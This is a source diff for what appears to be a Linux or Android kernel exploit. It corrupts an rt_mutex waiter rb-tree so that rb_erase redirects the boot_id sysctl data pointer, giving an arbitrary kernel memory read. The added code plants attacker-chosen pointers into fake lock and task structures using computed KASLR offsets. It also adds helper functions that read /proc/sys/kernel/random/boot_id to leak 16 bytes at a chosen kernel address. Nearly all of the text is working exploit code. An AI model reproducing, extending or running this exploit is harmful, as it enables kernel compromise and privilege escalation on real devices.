@@ -163,9 +163,17 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   } words[] = {
 #if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    /* Direct-boot_id design: waiter task = real dying init_task (compare-
+     * only, never dereferenced); only fake_lock is reclaimed.  The rb_erase
+     * target is the boot_id sysctl ctl_table.data.  Leafless: erase writes 0
+     * into parent->rb_child (redirects boot_id to a stack tmp_uuid).
+     * DIRECT_BOOTID_CHILD: tree_left = slide_oracle_child (Q) gives the
+     * waiter one child so rb_erase's `str child,[parent->rb_left]` plants Q
+     * into &ctl_table.data -> boot_id reads 16 bytes at Q (arbitrary read). */
     {0, slide_oracle_parent, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, slide_oracle_target, "tree_left"},
+    {2, slide_oracle_child ? slide_oracle_child : slide_oracle_target,
+     "tree_left"},
     {3, slide_oracle_parent, "pi_pc"},
     {4, 0, "pi_right"},
     {5, slide_oracle_target, "pi_left"},
@@ -177,7 +185,13 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {4, 0, "pi_right"},
     {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
 #endif
-#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    /* Direct-boot_id arms the waiter task with the real dying init_task
+     * (KASLR-computable) even when the build enables SLIDE_USE_FAKE_TASK,
+     * because DIRECT_BOOTID_RECLAIM routes fake_task to init_task at
+     * select time. */
+    {6, fake_task, "task"},
+#elif defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {6, fake_task, "task"},
 #else
     {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
@@ -767,12 +781,7 @@ static int slide_trigger_physical_slot(size_t slot) {
   }
   /* Crash-correlation: if the walk fires into a live page (reclaim miss),
    * the panic log's corrupted address should equal parent+0x08/+0x10 and the
-   * written value should equal target.  Print all four addresses so a later
-   * /data/log/prev_dump.log analysis can confirm or refute this. */
-  pr_info("p0 physical slot=%zu page_base=%016zx pipebuf=%016zx parent=%016zx "
-          "target=%016zx lock=%016zx task=%016zx\n",
-          slot, page_base, pipebuf_page_base, slide_oracle_parent,
-          slide_oracle_target, fake_lock, fake_task);
+   * written value should equal target. */
   char delay_arg[16];
   int delay = (int)slide_enter_delay_usec();
   slide_pselect_nfds = PSELECT_ROUTE_NFDS;
@@ -780,11 +789,23 @@ static int slide_trigger_physical_slot(size_t slot) {
   snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
   SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
   if (slide_trigger_physical_state()) {
+    if (getenv("DIRECT_BOOTID_RECLAIM")) {
+      /* After the erase, the boot_id sysctl points at the arbitrary-read
+       * oracle.  Read it to prove the walk completed and the retarget
+       * landed (reclaim success), vs. a fire that panics (reclaim miss). */
+      uint64_t oracle = 0;
+      int read_ok = slide_bootid_read64(&oracle);
+      pr_info("direct-bootid oracle read_ok=%d value=%016llx "
+              "parent=%016zx target=%016zx child=%016zx\n",
+              read_ok, (unsigned long long)oracle, slide_oracle_parent,
+              slide_oracle_target, slide_oracle_child);
+    }
     pr_info("p0 physical slot=%zu write attempt=1/1 delay=%d nfds=%d "
             "pad=%d\n",
             slot, delay, slide_pselect_nfds, slide_syscall_pad);
     return 1;
   }
+
   if (getenv("P0_ORACLE_GATE_DIAG") && slot == P0_ORACLE_GATE_SLOT) {
     /* The write may have fired without opening the early-wake window
      * (ret=0).  Verify the pipe oracle anyway so diagnostics can tell
@@ -1203,4 +1224,64 @@ int slide_leak_kernel_base(void) {
 
   return 0;
 #endif
+}
+
+#define SLIDE_BOOTID_PATH "/proc/sys/kernel/random/boot_id"
+
+/* Read the current boot_id sysctl value as a raw 16-byte UUID.
+ * /proc/sys/kernel/random/boot_id formats &sysctl_bootid with %pU, so after
+ * the rb_erase retargets the boot_id ctl_table.data pointer to an arbitrary
+ * kernel address Q, this returns the 16 bytes at Q.  Returns 1 on success. */
+int slide_bootid_read_uuid(unsigned char out[16]) {
+  char buf[64];
+  int fd = open(SLIDE_BOOTID_PATH, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n <= 0) {
+    errno = saved_errno;
+    return 0;
+  }
+  buf[n] = 0;
+  /* %pU emits 36 hex+dash chars: 8-4-4-4-12.  Parse the 32 hex digits in
+   * order into the 16 output bytes. */
+  int byte = 0;
+  int nib = 0;
+  for (size_t i = 0; buf[i] && byte < 16; i++) {
+    char c = buf[i];
+    int v;
+    if (c >= '0' && c <= '9') {
+      v = c - '0';
+    } else if (c >= 'a' && c <= 'f') {
+      v = c - 'a' + 10;
+    } else if (c >= 'A' && c <= 'F') {
+      v = c - 'A' + 10;
+    } else {
+      continue;
+    }
+    if (nib == 0) {
+      out[byte] = (unsigned char)(v << 4);
+      nib = 1;
+    } else {
+      out[byte] |= (unsigned char)v;
+      byte++;
+      nib = 0;
+    }
+  }
+  return byte == 16;
+}
+
+/* Read a 64-bit little-endian value from the 16-byte boot_id oracle. */
+int slide_bootid_read64(uint64_t *out) {
+  unsigned char uuid[16];
+  if (!slide_bootid_read_uuid(uuid)) {
+    return 0;
+  }
+  uint64_t value = 0;
+  memcpy(&value, uuid, sizeof(value));
+  *out = value;
+  return 1;
 }
